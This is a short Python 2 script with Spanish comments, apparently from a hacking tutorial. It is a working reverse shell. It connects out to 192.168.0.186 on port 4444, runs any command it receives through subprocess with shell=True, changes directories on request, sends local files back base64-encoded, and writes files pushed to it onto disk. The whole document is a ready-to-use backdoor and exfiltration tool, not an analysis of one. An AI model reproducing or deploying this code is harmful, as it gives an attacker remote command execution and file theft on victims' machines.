#!/usr/bin/env python
#_*_coding: utf8 _*_

#Librerias
#socket => Abrir puerto tcp
#os => directorios
#subprocess => comandos terminal
#base64 => conversion binaria
import socket
import os
import subprocess
import base64

def shell():
    directorio_actual = os.getcwd()
    cliente.send(directorio_actual) #directorio actual
    #Comandos
    while True:
        respuesta=cliente.recv(1024)
        if respuesta == "exit":
            break
        elif respuesta[:2] == "cd" and len(respuesta) > 2:
            os.chdir(respuesta[3:]) #cambiar directorio
            resultado = os.getcwd() #obtener directorio actual
            cliente.send(resultado)
        elif respuesta[:11] == "--descargar": #8 para contar caracteres
            #Descarga de archivo
             with open(respuesta[12:],'rb') as archivo_descarga: #rb lectura binaria
                cliente.send(base64.b64encode(archivo_descarga.read())) #Encargado de convertir carateres codeados en base 64 a texto plano y poder escribir
        elif respuesta[:8] == "--cargar":
            #Carga de archivo
            with open(respuesta[9:],'wb') as archivo_subida:
                datos = cliente.recv(30000)
                archivo_subida.write(base64.b64decode(datos)) 
        else:
            #Respuesta de terminal, correctas, errores, ejecuciones sin mensaje
            proc = subprocess.Popen(respuesta, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            resultado = proc.stdout.read() + proc.stderr.read()
            if len(resultado) == 0:
                cliente.send("1")
            else:              
                cliente.send(resultado)


cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(("192.168.0.186",4444))
shell()
cliente.close()